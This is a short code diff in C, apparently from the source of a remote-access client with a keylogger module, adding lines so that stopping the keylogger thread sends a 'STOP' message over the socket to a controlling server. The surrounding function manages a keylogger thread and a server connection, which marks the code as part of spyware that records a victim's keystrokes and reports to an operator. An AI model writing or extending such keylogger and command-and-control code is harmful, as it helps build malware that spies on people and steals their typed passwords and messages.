@@ -95,6 +95,12 @@ void handleKeyLoggerOpcode()
     if (clientData.isKeyLoggerActive && clientData.keyLoggerTid != -1)
     {
         pthread_cancel(clientData.keyLoggerTid);
+         //close(clientData.keyLoggerInputFile);
+        message_t msg;
+        msg.opCode = 'K';
+        strcpy(msg.buffer, "STOP");
+        msg.size = strlen(msg.buffer);
+        sendMessage(clientData.serverSocket, &msg);
         clientData.keyLoggerTid = -1;
         clientData.isKeyLoggerActive = 0;
     }
